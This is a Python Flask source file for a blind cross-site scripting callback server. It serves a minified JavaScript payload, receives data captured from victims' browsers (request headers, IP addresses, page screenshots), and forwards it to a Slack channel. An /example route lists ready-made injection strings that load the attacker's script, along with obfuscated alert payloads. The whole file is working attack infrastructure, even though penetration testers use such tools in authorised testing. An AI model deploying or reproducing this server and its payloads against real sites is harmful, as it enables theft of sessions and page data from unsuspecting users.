from flask import Flask, request, jsonify, make_response, render_template, get_template_attribute
from urllib.request import Request, urlopen
import uuid
import base64
import io
import requests
import json
from jsmin import jsmin

app = Flask(__name__, static_folder="")
TOKEN = "xoxb-<Token>"
CHANNELS = "#random"
BOT = 'https://hooks.slack.com/services/<URL>'


def slack_webhook(text):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    url = BOT
    data = {"channel": "#random", "username": "xss", "text": text, "mrkdwn": "true"}
    r = requests.post(url, data={"payload": json.dumps(data)}, headers=headers)
    print(r.text)


@app.route('/')
def send_js():
    with open('payload.js') as js_file:
        minified = jsmin(js_file.read())
    return minified, 200, {"Content-Type": "application/javascript"}


def get_ip():
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        return request.environ['REMOTE_ADDR']
    else:
        return request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0]


@app.route('/', defaults={'path': ''})
@app.route('/404/<path:path>')
def catch_all(path):
    headers = request.headers
    json_data = {"URI": request.path, "Remote IP": get_ip()}
    alert = generate_callback_alert(headers, json_data)
    slack_webhook(alert)
    return "404"


@app.route('/msg', methods=['POST'])
def msg():
    json_data = request.json
    json_data["Remote IP"] = get_ip()
    alert = generate_message_alert(json_data)
    slack_webhook(alert)
    return "ok"


@app.route('/co', methods=["POST", "OPTIONS"])
def less():
    if request.method == "OPTIONS":
        return _build_cors_preflight_response()
    elif request.method == "POST":
        print("=" * 16)
        img = ""
        json_data = request.json
        print(type(json_data))
        if "Screenshot" in json_data.keys():
            img = base64.b64decode(json_data["Screenshot"].replace("data:image/png;base64,", ""))
        json_data["Remote IP"] = get_ip()
        data = generate_xss_alert(json_data)
        slack_webhook(data)
        upload_img("xss.jpg", img)
        return "OK"
    else:
        return "err"


@app.route('/example', methods=["GET"])
def example():
    print(request.host, request.host_url)
    host = request.host
    payloads = [
        f'<script src=//{host}>',
        f'\'"><script src="//{host}"></script>\n\n',
        f'<script>$.getScript("//{host}")</script>',
        f'<img src=x onerror=jQuery[\'getScript\'](\'//{host}\')>',
        f'<details open ontoggle=eval("appendChild(createElement(\'script\')).src=\'//{host}\'")>',
        f'<img src=x onerror=s=createElement(\'script\');body.appendChild(s);s.src="https://{host}";>',
        f'javascript:eval(\'var a=document.createElement("script");a.src="https://{host}";document.body.appendChild(a)\')',
        '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "%s");a.send();</script>' % host,

    ]

    alerts = [
        "<details open ontoggle=eval(atob('YWxlcnQoMSk=')) >",
        "<details open ontoggle=\\u0065val(atob('YWxlcnQoMSk=')) >",
        "<details open ontoggle=eval('\\141\\154\\145\\162\\164\\50\\61\\51') >",
        "<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) >",
        "<onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) >"
    ]

    return render_template("example.html", payloads=payloads, alerts=alerts)


def generate_xss_alert(data):
    alert = "*XSS: Blind XSS Alert*\n"
    for k, v in data.items():
        if k == "Screenshot":
            continue
        if v == "":
            alert += "*" + k + ":* " + "```None```" + "\n"
        else:
            # alert += "*" + k + ":* " + "```" + v + "```" + "\n"
            # v = v.replace("\n", "\\n")
            alert += f"*%s:* ```%s```\n" % (k, v)
    return alert


def generate_message_alert(body):
    alert = "*XSS: Message Alert*\n"
    for k, v in body.items():
        alert += f"*%s:* `%s`\n" % (k, v)
    return alert


def generate_callback_alert(headers, data):
    alert = "*XSS: Out-of-Band Callback Alert*\n"
    alert += f"• *IPAddress: *`{data['Remote IP']}`\n"
    alert += f"• *Request URI: * `{data['URI']}`\n"
    for k, v in headers.items():
        alert += f"• *{k}: * `{v}`\n"
    return alert


def _build_cors_preflight_response():
    response = make_response()
    response.headers.add("Access-Control-Allow-Origin", "*")
    response.headers.add('Access-Control-Allow-Headers', "*")
    response.headers.add('Access-Control-Allow-Methods', "*")
    return response


def upload_img(filename, img_body):
    boundary = f"--------------{uuid.uuid4()}"
    sep_boundary = b"\r\n--" + boundary.encode("ascii")
    end_boundary = sep_boundary + b"--\r\n"
    body = io.BytesIO()

    png = (
            f'\r\nContent-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            + f"Content-Type: image/png\r\n\r\n"
    )
    body.write(sep_boundary)
    body.write(png.encode('ascii') + img_body)
    body.write(sep_boundary)
    title = f'\r\nContent-Disposition: form-data; name="channels"\r\n\r\n' + CHANNELS
    body.write(title.encode('ascii'))
    body.write(end_boundary)
    body = body.getvalue()

    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}", "Content-Length": len(body),
               "Authorization": f"Bearer {TOKEN}", "Host": "slack.com"}

    req = Request(method="POST", url="https://slack.com/api/files.upload", data=body, headers=headers)
    print(req.data)

    with urlopen(req) as f:
        print('Status:', f.status, f.reason)
        for k, v in f.getheaders():
            print('%s: %s' % (k, v))
        print(f.read())
